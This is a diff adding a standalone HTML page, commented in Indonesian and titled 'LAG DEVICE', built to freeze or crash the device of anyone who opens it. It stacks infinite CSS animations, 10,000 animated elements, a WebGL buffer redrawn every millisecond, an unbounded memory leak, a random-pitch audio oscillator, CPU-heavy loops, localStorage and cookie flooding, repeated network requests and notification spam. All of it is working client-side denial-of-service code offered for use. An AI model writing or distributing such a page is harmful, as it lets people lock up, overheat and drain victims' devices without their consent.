@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LAG DEVICE - HUFFLE303</title>
+    <style>
+        /* 1. CSS Bomb */
+        * { animation: destroy 0.1s infinite; }
+        @keyframes destroy {
+            0% { transform: rotate(0deg) scale(1); opacity: 1; }
+            100% { transform: rotate(360deg) scale(10); opacity: 0; }
+        }
+        
+        /* 2. Render Ribuan Elemen Overlay */
+        body::before, body::after {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: radial-gradient(circle, red, blue, green);
+            mix-blend-mode: difference;
+            animation: spin 0.05s infinite linear;
+        }
+        
+        /* 3. Infinite Loop Animations */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- 4. Ribuan Elemen DOM -->
+    <div id="bomb"></div>
+    
+    <!-- 5. WebGL GPU Bomb -->
+    <canvas id="gpuKiller"></canvas>
+    
+    <!-- 6. Audio Loop + Decode Bomb -->
+    <audio id="audioBomb" loop>
+        <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ" type="audio/wav">
+    </audio>
+
+    <script>
+        // 7. Bom Elemen DOM (10.000 div dengan animasi)
+        const bomb = document.getElementById('bomb');
+        for(let i = 0; i < 10000; i++) {
+            const div = document.createElement('div');
+            div.style.cssText = `
+                position: absolute;
+                top: ${Math.random() * 200}vh;
+                left: ${Math.random() * 200}vw;
+                width: 100px; height: 100px;
+                background: radial-gradient(circle, 
+                    rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255}),
+                    rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255}));
+                animation: spin ${Math.random()*0.1}s infinite linear;
+                filter: blur(${Math.random()*10}px);
+            `;
+            bomb.appendChild(div);
+        }
+
+        // 8. WebGL GPU Overload
+        const canvas = document.getElementById('gpuKiller');
+        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+        if (gl) {
+            const vertices = new Float32Array(1000000);
+            for(let i = 0; i < vertices.length; i++) vertices[i] = Math.random();
+            const buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.DYNAMIC_DRAW);
+            setInterval(() => {
+                for(let i = 0; i < vertices.length; i++) vertices[i] = Math.random();
+                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.DYNAMIC_DRAW);
+                gl.drawArrays(gl.POINTS, 0, vertices.length / 3);
+            }, 1);
+        }
+
+        // 9. Infinite Loop + Memory Leak
+        let leak = [];
+        setInterval(() => {
+            for(let i = 0; i < 1000; i++) {
+                leak.push(new Array(100000).fill('LAG'));
+                document.createElement('div');
+            }
+        }, 50);
+
+        // 10. Bomb Audio Processing
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        oscillator.connect(audioCtx.destination);
+        oscillator.start();
+        oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
+        setInterval(() => {
+            oscillator.frequency.setValueAtTime(Math.random() * 2000, audioCtx.currentTime);
+        }, 1);
+
+        // 11. Bomb Event Listeners (Makin banyak interaksi, makin lag)
+        document.addEventListener('mousemove', () => {
+            for(let i = 0; i < 100; i++) {
+                document.dispatchEvent(new Event('scroll'));
+            }
+        });
+
+        // 12. CPU Intensive Calculation
+        setInterval(() => {
+            let sum = 0;
+            for(let i = 0; i < 10000000; i++) sum += Math.sqrt(i);
+        }, 100);
+
+        // 13. Bom Storage & Cookie
+        setInterval(() => {
+            localStorage.setItem('bomb', new Array(1000000).fill('X').join(''));
+            document.cookie = `bomb=${new Array(10000).fill('Y').join('')}; path=/`;
+        }, 1000);
+
+        // 14. Bom Network (Jika ada koneksi)
+        setInterval(() => {
+            fetch('https://httpbin.org/delay/10').catch(() => {});
+        }, 500);
+
+        // 15. Bom Battery API (Jika didukung)
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                setInterval(() => {
+                    battery.level;
+                    battery.charging;
+                }, 10);
+            });
+        }
+
+        // 16. Bom Notification API
+        setInterval(() => {
+            if (Notification.permission === 'granted') {
+                new Notification('LAG BOMB', { body: 'Device lu bakal meledak' });
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
